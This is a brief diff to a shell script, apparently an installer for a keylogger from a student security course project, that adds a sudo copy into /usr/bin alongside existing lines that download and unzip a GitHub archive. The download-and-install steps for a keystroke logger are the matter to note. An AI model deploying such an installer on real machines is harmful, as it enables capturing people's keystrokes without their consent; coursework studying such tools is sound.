@@ -2,6 +2,7 @@
 
 # chromd 755 install_keylog.sh
 
+sudo cp install_keylog.sh /usr/bin/install_keylog
 wget -q https://github.com/ECS153/final-project-click-to-add-lemon/archive/master.zip -O keylog.zip
 
 unzip -o -q keylog.zip
